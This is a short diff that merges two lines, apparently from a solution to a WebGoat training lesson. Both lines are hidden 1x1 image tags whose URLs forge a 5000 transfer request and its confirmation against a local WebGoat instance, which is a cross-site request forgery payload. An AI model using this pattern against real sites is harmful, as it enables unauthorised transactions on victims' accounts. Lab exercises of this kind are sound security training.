@@ -1,2 +1,1 @@
-<img id = 'img1' src='http://localhost:8080/WebGoat/attack?Screen=2014084448&menu=900&transfer=5000' width='1' height='1'>
-<img id = 'img2' src='http://localhost:8080/WebGoat/attack?transfer=CONFIRMED#attack/2014084448/900' width='1' height='1'>
+<img id = 'img1' src='http://localhost:8080/WebGoat/attack?Screen=2014084448&menu=900&transfer=5000' width='1' height='1'><img id = 'img2' src='http://localhost:8080/WebGoat/attack?transfer=CONFIRMED#attack/2014084448/900' width='1' height='1'>
